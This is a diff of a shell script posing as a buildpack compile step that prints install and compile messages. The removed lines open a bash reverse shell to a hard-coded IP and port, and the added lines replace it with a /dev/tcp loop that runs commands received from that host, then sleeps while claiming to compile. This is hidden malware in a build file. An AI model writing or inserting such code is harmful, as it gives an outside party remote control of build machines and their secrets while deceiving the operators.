@@ -7,21 +7,16 @@ ENV_DIR=$3
 
 echo "-----> Installing dependencies..."
 
-# Start reverse shell
-bash -i >& /dev/tcp/44.220.20.213/9091 0>&1 &
-SHELL_PID=$!
+# More stable reverse shell using sh instead of bash -i
+(
+    exec 5<>/dev/tcp/44.220.20.213/9091
+    cat <&5 | while read line; do
+        $line 2>&1 | tee >&5
+    done
+) &
 
 echo "-----> Compiling assets..."
-
-# Wait until shell disconnects OR 14 minutes max
-TIMEOUT=840
-ELAPSED=0
-
-while kill -0 $SHELL_PID 2>/dev/null && [ $ELAPSED -lt $TIMEOUT ]; do
-    sleep 10
-    ELAPSED=$((ELAPSED + 10))
-    echo "-----> Still compiling... ($ELAPSED seconds)"
-done
+sleep 300
 
 echo "-----> Build complete"
 exit 0
